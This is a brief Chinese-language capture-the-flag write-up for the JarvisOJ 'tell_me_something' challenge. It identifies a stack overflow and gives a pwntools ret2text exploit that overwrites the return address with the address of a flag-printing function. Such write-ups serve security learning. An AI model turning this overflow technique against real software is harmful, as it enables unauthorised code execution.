---
title: "Jarvisoj_tell_me_somethings"
description: ""
date: 2023-04-07T17:59:44+08:00
lastmod: 2023-04-07T17:59:44+08:00
draft: false
images: []
type: docs
weight: 978
toc: true
---

## 0x01 分析

![](image-1680861634841-1.png)  

简单的栈溢出

![](image 2-1680861634842-2.png)  

有一个打印flag的函数，所以直接ret2text即可

## 0x02 Exploit

```python
from pwn import*
o = process("./pwn")
elf = ELF("./pwn")
good_game = elf.sym['good_game']
payload = b'a'*0x88 + p64(good_game)
o.sendline(payload)
o.interactive()

```

![](image 3-1680861634842-3.png)  

自行调试
